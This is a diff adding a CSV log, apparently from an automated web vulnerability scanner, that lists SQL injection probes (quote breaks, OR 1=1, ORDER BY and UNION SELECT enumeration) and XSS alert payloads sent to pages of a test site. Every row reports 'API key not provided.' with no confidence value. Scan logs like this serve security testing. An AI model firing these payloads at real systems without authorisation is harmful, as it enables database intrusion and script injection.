@@ -1,0 +1,75 @@
+type,url,form_action,payload,reason,confidence
+SQL Injection,http://testphp.vulnweb.com/categories.php,search.php?test=query,',API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/categories.php,search.php?test=query,"""",API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/categories.php,search.php?test=query,OR 1=1,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/categories.php,search.php?test=query,OR '1'='1,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/categories.php,search.php?test=query,--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/categories.php,search.php?test=query,;,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/categories.php,search.php?test=query,';-,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/categories.php,search.php?test=query,1' ORDER BY 1--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/categories.php,search.php?test=query,1' ORDER BY 2--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/categories.php,search.php?test=query,1' ORDER BY 3--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/categories.php,search.php?test=query,1' UNION SELECT NULL--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/categories.php,search.php?test=query,"1' UNION SELECT NULL, NULL--",API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/categories.php,search.php?test=query,"1' UNION SELECT 1, 'a', 'b'--",API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/index.php,search.php?test=query,',API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/index.php,search.php?test=query,"""",API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/index.php,search.php?test=query,OR 1=1,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/index.php,search.php?test=query,OR '1'='1,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/index.php,search.php?test=query,--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/index.php,search.php?test=query,;,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/index.php,search.php?test=query,';-,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/index.php,search.php?test=query,1' ORDER BY 1--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/index.php,search.php?test=query,1' ORDER BY 2--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/index.php,search.php?test=query,1' ORDER BY 3--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/index.php,search.php?test=query,1' UNION SELECT NULL--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/index.php,search.php?test=query,"1' UNION SELECT NULL, NULL--",API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/index.php,search.php?test=query,"1' UNION SELECT 1, 'a', 'b'--",API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/artists.php,search.php?test=query,',API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/artists.php,search.php?test=query,"""",API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/artists.php,search.php?test=query,OR 1=1,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/artists.php,search.php?test=query,1' UNION SELECT NULL--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/artists.php,search.php?test=query,"1' UNION SELECT NULL, NULL--",API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/artists.php,search.php?test=query,"1' UNION SELECT 1, 'a', 'b'--",API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,',API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,"""",API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,OR 1=1,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,OR '1'='1,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,;,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,';-,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,1' ORDER BY 1--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,1' ORDER BY 2--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,1' ORDER BY 3--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,1' UNION SELECT NULL--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,"1' UNION SELECT NULL, NULL--",API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,"1' UNION SELECT 1, 'a', 'b'--",API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/,search.php?test=query,',API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/,search.php?test=query,"""",API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/,search.php?test=query,OR 1=1,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/,search.php?test=query,OR '1'='1,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/,search.php?test=query,--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/,search.php?test=query,;,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/,search.php?test=query,';-,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/,search.php?test=query,1' ORDER BY 1--,API key not provided.,N/A
+SQL Injection,http://testphp.vulnweb.com/,search.php?test=query,1' ORDER BY 2--,API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/categories.php,search.php?test=query,<script>alert('XSS')</script>,API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/categories.php,search.php?test=query,<img src=x onerror=alert('XSS')>,API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/categories.php,search.php?test=query,"'""><script>alert('XSS')</script>",API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/categories.php,search.php?test=query,<body onload=alert('XSS')>,API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/index.php,search.php?test=query,<script>alert('XSS')</script>,API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/index.php,search.php?test=query,<img src=x onerror=alert('XSS')>,API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/index.php,search.php?test=query,"'""><script>alert('XSS')</script>",API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/index.php,search.php?test=query,<body onload=alert('XSS')>,API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/artists.php,search.php?test=query,<script>alert('XSS')</script>,API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/artists.php,search.php?test=query,<img src=x onerror=alert('XSS')>,API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/artists.php,search.php?test=query,"'""><script>alert('XSS')</script>",API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/artists.php,search.php?test=query,<body onload=alert('XSS')>,API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,<script>alert('XSS')</script>,API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,<img src=x onerror=alert('XSS')>,API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,"'""><script>alert('XSS')</script>",API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/disclaimer.php,search.php?test=query,<body onload=alert('XSS')>,API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/,search.php?test=query,<script>alert('XSS')</script>,API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/,search.php?test=query,<img src=x onerror=alert('XSS')>,API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/,search.php?test=query,"'""><script>alert('XSS')</script>",API key not provided.,N/A
+XSS,http://testphp.vulnweb.com/,search.php?test=query,<body onload=alert('XSS')>,API key not provided.,N/A
